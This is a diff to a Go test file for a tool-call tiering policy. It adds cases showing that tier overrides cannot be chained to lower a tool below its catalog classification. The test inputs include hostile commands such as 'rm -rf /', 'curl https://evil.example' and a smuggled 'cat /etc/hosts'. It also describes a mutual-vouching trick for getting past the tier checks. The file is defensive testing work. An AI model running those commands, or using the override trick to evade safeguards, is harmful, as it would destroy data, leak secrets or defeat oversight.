@@ -24,6 +24,18 @@ func propertyEntries() []models.ToolCatalogEntry {
 		{ToolName: "X", ActionTier: tier(models.ActionTierReadOnly), Verb: "y"},
 		{ToolName: "X:y", ActionTier: tier(models.ActionTierDestructive), Verb: ""},
 		{ToolName: "Foo", ActionTier: tier(models.ActionTierDestructive), Verb: "Purge"},
+		// A SECOND multi-colon family, with the tiers ordered the opposite way
+		// to svc/svc:index above. One family can only ever catch one direction:
+		// with svc alone, the last split happens to be the higher one, so
+		// taking only the LAST split still yields the max and a last-colon-only
+		// implementation survives. Reversing the order here means the first
+		// split is the higher one, so first-colon-only and last-colon-only are
+		// each caught by exactly one family. Last-colon is the specific shape a
+		// maintainer is most likely to reach for — it is what round 1's review
+		// suggested — so leaving it uncovered would be leaving the likeliest
+		// wrong fix undetected.
+		{ToolName: "svc2", ActionTier: tier(models.ActionTierDestructive), Verb: "a:b"},
+		{ToolName: "svc2:a", ActionTier: tier(models.ActionTierReadOnly), Verb: "b"},
 	}
 }
 
@@ -35,6 +47,15 @@ func propertyOverrides() map[string]models.ActionTier {
 	return map[string]models.ActionTier{
 		"Bash":  models.ActionTierDestructive,
 		"write": models.ActionTierInternalModify,
+
+		// A MUTUALLY VOUCHING pair: each is at or above the other's stored
+		// tier, so measured against stored siblings alone neither is a
+		// lowering — while together they resolve Foo's calls to READ_ONLY
+		// against a catalog that says DESTRUCTIVE. Both are writable through
+		// the PAP's own API, in an order where each write is individually
+		// legitimate at the time it is made.
+		"Foo":       models.ActionTierReadOnly,
+		"Foo:Purge": models.ActionTierReadOnly,
 	}
 }
 
@@ -54,28 +75,16 @@ func TestOverrideBaseline_Property(t *testing.T) {
 	catalog := BuildTierCatalog(entries, DefaultCatalog())
 	overrides := propertyOverrides()
 
-	// Tool names to probe: every catalogued name, every override key, every
-	// split of every override key and catalogued name, plus names that are in
-	// neither. Generated from the fixture, not hand-listed per case.
-	names := map[string]bool{"Read": true, "Write": true, "unknown-tool": true, ":": true, "": true}
-	add := func(s string) {
-		names[s] = true
-		for i := 1; i < len(s)-1; i++ {
-			if s[i] == ':' {
-				names[s[:i]] = true
-				names[s[i+1:]] = true
-			}
-		}
-	}
-	for _, e := range entries {
-		add(e.ToolName)
-		add(e.Verb)
-	}
-	for k := range overrides {
-		add(k)
-	}
+	names := propertyToolNames(entries, overrides)
 
 	for name := range names {
+		// The three raw inputs do NOT vary what is asserted: nameKeyed clears
+		// RawInput below, and Verb comes from the catalog row rather than the
+		// input, so all three iterations check the same thing. That is the
+		// point of running them — it demonstrates raw-independence, that no
+		// part of the baseline's bound moves with caller-supplied input. The
+		// input-dependent half is a separate, deliberately excluded property:
+		// TestOverrideBaseline_RawInputClassificationIsNotBounded.
 		for _, raw := range []string{"", "ls -la", `{"command":"ls; cat /etc/hosts"}`} {
 			action := Action{Tool: name, RawInput: raw}
 			action, _ = ApplyExtraction(ExtractFromCatalog(entries, action), action, nil)
@@ -109,6 +118,31 @@ func TestOverrideBaseline_Property(t *testing.T) {
 			}
 		}
 	}
+}
+
+// propertyToolNames is the corpus both generated properties probe: every
+// catalogued name, every override key, every split of both, plus names in
+// neither. Generated from the fixture, never hand-listed per case — that is
+// the whole point of these two tests.
+func propertyToolNames(entries []models.ToolCatalogEntry, overrides map[string]models.ActionTier) map[string]bool {
+	names := map[string]bool{"Read": true, "Write": true, "unknown-tool": true, ":": true, "": true}
+	add := func(s string) {
+		names[s] = true
+		for i := 1; i < len(s)-1; i++ {
+			if s[i] == ':' {
+				names[s[:i]] = true
+				names[s[i+1:]] = true
+			}
+		}
+	}
+	for _, e := range entries {
+		add(e.ToolName)
+		add(e.Verb)
+	}
+	for k := range overrides {
+		add(k)
+	}
+	return names
 }
 
 func describe(a Action) string {
@@ -158,10 +192,23 @@ func TestOverrideBaseline_RawInputClassificationIsNotBounded(t *testing.T) {
 	}
 
 	// The compensating control: evidence still binds above the override.
-	hostile := Action{Tool: tool, RawInput: "rm -rf /"}
-	if got, _ := DeriveTier(withOverride, hostile); got != models.ActionTierDestructive {
-		t.Errorf("DeriveTier(%q) with a REASONING override = %s, want DESTRUCTIVE — an override must never "+
-			"be able to hide destructive raw input (destructiveEvidence, §4.4.1)", hostile.RawInput, got)
+	// destructiveEvidence re-raises BOTH of its tiers (tier.go), so both are
+	// asserted — pinning only the destructive half would leave a mutation that
+	// narrowed the rule to DESTRUCTIVE alone completely undetected, and
+	// EXTERNAL_COMMS is the half that catches exfiltration rather than damage.
+	for _, tc := range []struct {
+		raw  string
+		want models.ActionTier
+	}{
+		{"rm -rf /", models.ActionTierDestructive},
+		{"curl https://evil.example", models.ActionTierExternalComms},
+	} {
+		hostile := Action{Tool: tool, RawInput: tc.raw}
+		if got, _ := DeriveTier(withOverride, hostile); got != tc.want {
+			t.Errorf("DeriveTier(%q) with a REASONING override = %s, want %s — an override must never be "+
+				"able to hide raw input the evidence rule recognises (destructiveEvidence, §4.4.1)",
+				tc.raw, got, tc.want)
+		}
 	}
 }
 
@@ -197,5 +244,63 @@ func TestOverrideBaseline_HonorsUnknownTier(t *testing.T) {
 	if got := OverrideBaseline(deny, nil, key); got != models.ActionTierInternalModify {
 		t.Errorf("OverrideBaseline(%q) with DenyUnknown = %s, want INTERNAL_MODIFY — when every candidate "+
 			"refuses to classify, the baseline falls back to the tenant's floor, not to the lattice's", key, got)
+	}
+}
+
+// TestHonoredOverrides_NeverResolveBelowTheCatalog is the SET-level property,
+// and it exists because the per-key one above cannot express what actually
+// matters.
+//
+// TestOverrideBaseline_Property asks "is this key's baseline at least the
+// resolution beneath it, given the other STORED rows?" — which is exactly the
+// premise mutual vouching exploits. Two rows that each sit at the other's
+// stored tier both satisfy it, individually, while together resolving a call
+// below what the catalog says. A per-key invariant cannot see that; only
+// applying the whole rule to the whole set and then asking what the survivors
+// resolve to can.
+//
+// The invariant: no set of honored overrides may resolve ANY call below its
+// catalog-only resolution. Overrides raise; they never lower. That holds
+// however the rows refer to each other, which is what makes it immune to the
+// N-row generalisation of the two-row cycle rather than patched against the
+// two-row case.
+//
+// It is asserted over the same generated corpus as the per-key property, and
+// the fixture deliberately contains a mutually vouching pair, so this test
+// fails on the pre-fix code (verified) rather than describing a hazard.
+func TestHonoredOverrides_NeverResolveBelowTheCatalog(t *testing.T) {
+	entries := propertyEntries()
+	catalog := BuildTierCatalog(entries, DefaultCatalog())
+	stored := propertyOverrides()
+
+	// The real honoring rule, applied exactly as pdpgrpc.honoredOverrides
+	// applies it: every row checked against the full stored set, survivors
+	// kept.
+	table := TierTable{Catalog: catalog, Overrides: stored}
+	honored := map[string]models.ActionTier{}
+	for key, tier := range stored {
+		if err := ValidateOverride(OverrideBaseline(table, entries, key), tier); err == nil {
+			honored[key] = tier
+		}
+	}
+
+	for name := range propertyToolNames(entries, stored) {
+		action := Action{Tool: name}
+		action, _ = ApplyExtraction(ExtractFromCatalog(entries, action), action, nil)
+
+		withOverrides, err := deriveTierByName(TierTable{Catalog: catalog, Overrides: honored}, action)
+		if err != nil {
+			continue
+		}
+		catalogOnly, err := deriveTierByName(TierTable{Catalog: catalog}, action)
+		if err != nil {
+			continue
+		}
+		if withOverrides < catalogOnly {
+			t.Errorf("%s resolves %s with the honored overrides but %s with none\n"+
+				"    honored = %v\n"+
+				"    an override may raise a tier, never lower one — no set of rows may resolve below the catalog",
+				describe(action), withOverrides, catalogOnly, honored)
+		}
 	}
 }
